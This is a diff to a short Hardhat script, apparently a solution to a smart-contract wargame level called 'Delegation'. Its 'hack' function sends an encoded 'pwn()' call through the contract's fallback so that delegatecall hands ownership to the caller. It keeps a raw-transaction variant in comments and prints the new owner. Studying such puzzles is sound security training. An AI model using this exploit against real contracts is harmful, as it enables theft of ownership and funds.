@@ -1,7 +1,7 @@
 import { ethers } from "hardhat";
 
 const CONTRACT_NAME = "Delegation";
-const CONTRACT_ADDRESS = "0xF781b45d11A37c51aabBa1197B61e6397aDf1f78";
+const CONTRACT_ADDRESS = "0xea9a55cF7198A4Bf1A5d41F4b91122e9CA0Ff1E2";
 
 async function hack() {
   const [wallet] = await ethers.getSigners();
@@ -12,12 +12,19 @@ async function hack() {
   const iface = new ethers.utils.Interface(["function pwn()"]);
   const data = iface.encodeFunctionData("pwn");
 
-  const tx = await wallet.sendTransaction({
-    to: contract.address,
+  const tx = await contract.fallback({
     data,
     gasLimit: 100000,
   });
   await tx.wait();
+
+  // other way to hack
+  // const tx = await wallet.sendTransaction({
+  //   to: CONTRACT_ADDRESS,
+  //   data,
+  //   gasLimit: 100000,
+  // });
+  // await tx.wait();
 
   const owner = await contract.owner();
   console.log("owner : ", owner);
